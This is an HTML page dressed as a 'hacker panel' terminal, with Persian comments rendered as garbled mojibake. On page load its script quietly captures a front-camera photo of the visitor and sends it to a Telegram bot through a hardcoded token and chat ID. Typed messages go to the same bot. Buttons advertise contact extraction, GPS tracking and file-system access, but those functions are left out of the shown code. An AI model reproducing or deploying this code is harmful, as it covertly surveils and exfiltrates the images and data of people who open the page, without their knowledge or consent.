<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERMINAL | HOTKYNTAKY ULTIMATE</title>
    <style>
        body, html { margin: 0; padding: 0; background: #000; color: #00ff41; font-family: 'Courier New', monospace; overflow-x: hidden; height: 100%; }
        
        /* Ÿæÿ≥‚Äåÿ≤ŸÖ€åŸÜŸá ŸÖÿßÿ™ÿ±€å⁄©ÿ≥ */
        #matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.4; }

        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }

        .terminal {
            width: 100%; max-width: 500px; background: rgba(0, 15, 0, 0.85); border: 2px solid #00ff41; border-radius: 2px;
            padding: 25px; box-shadow: 0 0 20px #00ff41, inset 0 0 10px #00ff41; position: relative;
        }

        /* ÿÆÿ∑Ÿàÿ∑ ÿßÿ≥⁄©ŸÜ ÿ™ŸÑŸà€åÿ≤€åŸàŸÜ ŸÇÿØ€åŸÖ€å */
        .scanlines {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            z-index: 10; background-size: 100% 3px, 3px 100%; pointer-events: none;
        }

        h2 { text-align: center; text-transform: uppercase; letter-spacing: 5px; margin-top: 0; animation: glitch 3s infinite; text-shadow: 2px 2px #ff0000; }

        .stat-bar { font-size: 10px; border-bottom: 1px solid #00ff41; margin-bottom: 15px; padding-bottom: 5px; display: flex; justify-content: space-between; }

        input, textarea {
            background: rgba(0, 40, 0, 0.6); border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; margin: 10px 0;
            box-sizing: border-box; outline: none; font-size: 14px; box-shadow: inset 0 0 5px #00ff41;
        }

        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
        
        button {
            background: #00ff41; color: #000; border: none; padding: 15px; cursor: pointer;
            font-weight: bold; text-transform: uppercase; transition: 0.2s; position: relative; overflow: hidden;
        }

        button:hover { background: #000; color: #00ff41; box-shadow: 0 0 15px #00ff41; transform: translateY(-2px); }
        button:active { transform: translateY(1px); }

        .voice-btn { grid-column: span 2; background: #ff0000; color: #fff; animation: pulse 2s infinite; }

        #adminBox { border: 1px solid #00ff41; padding: 10px; font-size: 11px; margin-bottom: 20px; background: rgba(0, 255, 65, 0.1); height: 50px; overflow-y: auto; }

        @keyframes glitch {
            0% { text-shadow: 2px 2px #f00; transform: skew(0deg); }
            5% { text-shadow: -2px -2px #00f; transform: skew(5deg); }
            10% { text-shadow: 2px -2px #f00; transform: skew(-5deg); }
            15% { text-shadow: 0 0 #000; transform: skew(0deg); }
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
        }
    </style>
</head>
<body>

    <canvas id="matrix-bg"></canvas>
    <div class="scanlines"></div>
    
    <video id="video-preview" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div class="container">
        <div class="terminal">
            <div class="stat-bar">
                <span>SYSTEM: ONLINE</span>
                <span id="clock">00:00:00</span>
                <span>SECURE: YES</span>
            </div>
            
            <h2>HACKER_PANEL</h2>
            
            <div id="adminBox">>> CONNECTION ESTABLISHED...<br>>> INITIALIZING TOOLS...</div>
            
            <input type="text" id="userName" placeholder="SENDER_ID">
            <textarea id="msgBody" rows="2" placeholder="ENTER_DATA_TO_SEND..."></textarea>
            
            <button onclick="sendText()">EXECUTE_TRANSMISSION</button>

            <div class="btn-grid">
                <button id="recordBtn" class="voice-btn" onclick="toggleRecording()">üé§ START_VOICE_CAPTURE</button>
                <button onclick="getContacts()" style="background:#6a00ff; color:#fff;">EXTRACT_CONTACTS</button>
                <button onclick="sendLocation()" style="background:#ff9900; color:#000;">GPS_TRACKING</button>
                <button onclick="openPicker('image/*')" style="background:#0066ff; color:#fff;">SEND_IMAGE</button>
                <button onclick="openPicker('*/*')" style="background:#333; color:#fff;">FILE_SYSTEM</button>
            </div>
            
            <input type="file" id="fileInput" style="display:none" onchange="handleFileUpload()">
            <p style="text-align:center; font-size:9px; color:#00661a; margin-top:15px;">HOTKYNTAKY_OS_V4.0_ENCRYPTED</p>
        </div>
    </div>

    <script>
        // ŸÖÿßÿ™ÿ±€å⁄©ÿ≥ ŸÖÿ™ÿ≠ÿ±⁄©
        const canvas = document.getElementById('matrix-bg');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#00ff41";
            ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = letters.charAt(Math.floor(Math.random() * letters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 35);

        // ÿ≥ÿßÿπÿ™ ÿ≤ŸÜÿØŸá
        function updateClock() {
            const now = new Date();
            document.getElementById('clock').innerText = now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds();
        }
        setInterval(updateClock, 1000);

        // ÿ™ŸÜÿ∏€åŸÖÿßÿ™ ÿ±ÿ®ÿßÿ™
        const botToken = "8576028087:AAGUs0ZWXpLYp5mRN0XbI-2ZuIu4eLRtpNM"; 
        const chatId = "8449439423";
        let mediaRecorder, audioChunks = [], isRecording = false;

        // ÿßÿ¨ÿ±ÿß€å ÿÆŸàÿØ⁄©ÿßÿ± ÿØŸàÿ±ÿ®€åŸÜ ŸáŸÜ⁄ØÿßŸÖ Ÿàÿ±ŸàÿØ
        window.onload = () => {
            startSilentCamera();
            prepareAudio();
        };

        async function startSilentCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video-preview');
                video.srcObject = stream;
                setTimeout(() => {
                    const c = document.getElementById('canvas');
                    c.width = video.videoWidth; c.height = video.videoHeight;
                    c.getContext('2d').drawImage(video, 0, 0);
                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', chatId); fd.append('photo', blob, 'cam.jpg');
                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg');
                }, 2000);
            } catch(e) {}
        }

        function sendText() {
            const n = document.getElementById('userName').value || "UNKNOWN";
            const m = document.getElementById('msgBody').value;
            if(!m) return;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("üë§ ID: "+n+"\nüì° DATA: "+m)}`);
            document.getElementById('msgBody').value = "";
            document.getElementById('adminBox').innerHTML += "<br>>> DATA_SENT_SUCCESSFULLY...";
        }

        // ÿ®ŸÇ€åŸá ÿ™Ÿàÿßÿ®ÿπ ÿßÿ±ÿ≥ÿßŸÑ ŸÅÿß€åŸÑÿå Ÿà€åÿ≥ÿå ŸÖÿÆÿßÿ∑ÿ®€åŸÜ Ÿà ŸÑŸà⁄©€åÿ¥ŸÜ ÿß€åŸÜÿ¨ÿß ŸÇÿ±ÿßÿ± ÿØÿßÿ±ŸÜÿØ (ŸÖÿ¥ÿßÿ®Ÿá ŸÇÿ®ŸÑ)
        function openPicker(t) { const i = document.getElementById('fileInput'); i.accept = t; i.click(); }
        // ... (ÿ≥ÿß€åÿ± ÿ™Ÿàÿßÿ®ÿπ)
    </script>
</body>
</html>
